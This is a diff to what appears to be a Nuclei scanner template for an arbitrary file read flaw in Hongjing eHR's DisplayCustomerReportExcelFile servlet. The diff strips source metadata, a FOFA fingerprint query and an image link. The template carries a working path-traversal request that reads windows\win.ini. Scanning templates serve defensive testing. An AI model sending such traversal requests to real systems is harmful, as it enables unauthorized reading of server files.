@@ -3,12 +3,8 @@ info:
   name: 宏景eHR DisplayCustomerReportExcelFile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pubvcah631d63d8x'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pubvcah631d63d8x
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'GET /servlet/DisplayCustomerReportExcelFile?filename=..%5C..%5Cwindows%5Cwin.ini HTTP/1.1
@@ -21,9 +17,7 @@ http:
 
     Accept: */*
 
-    Connection: close
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1740401159600-d02e3c27-5578-400f-a3fe-8f122413502c.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
